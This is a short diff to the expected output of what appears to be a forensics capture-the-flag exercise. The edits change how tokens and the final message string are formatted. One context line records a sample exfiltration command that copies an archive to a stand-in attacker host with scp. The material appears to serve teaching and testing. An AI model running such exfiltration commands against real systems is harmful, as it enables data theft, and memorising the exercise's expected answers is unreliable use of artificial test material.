@@ -9,8 +9,8 @@ EVIDENCE[KEYPAD].SAMPLE=2025-08-09T12:02:35Z lab1 sshd[3557]: Failed password fo
 EVIDENCE[KEYPAD].MALFORMED_SKIPPED=1
 [Room DNS] Decoding hints...
 Decoded line: "Signals converge in the vista if you read between lines."
-Token formed: lines.
-TOKEN[DNS]=lines.
+Token formed: lines
+TOKEN[DNS]=lines
 EVIDENCE[DNS].KEY=hint1
 EVIDENCE[DNS].DECODED_LINE=Signals converge in the vista if you read between lines.
 TOKEN[SAFE]=19-19-38
@@ -22,5 +22,5 @@ EVIDENCE[PID].PATH=[132->135->136->140]
 EVIDENCE[PID].CMD="scp /tmp/x.tgz attacker@198.51.100.33:/upload"
 [Room Final] Reading final_gate.txt...
 FINAL_GATE=PENDING
-MSG=msc-group-10|12073-lines.-SAFE{19-19-38}-140
+MSG=msc-group-10|12073-lines-19-19-38-140
 EXPECTED_HMAC=9a531e8c0429d007024f8d61349453d62f005b79f9d7fa245231bff8aad23107
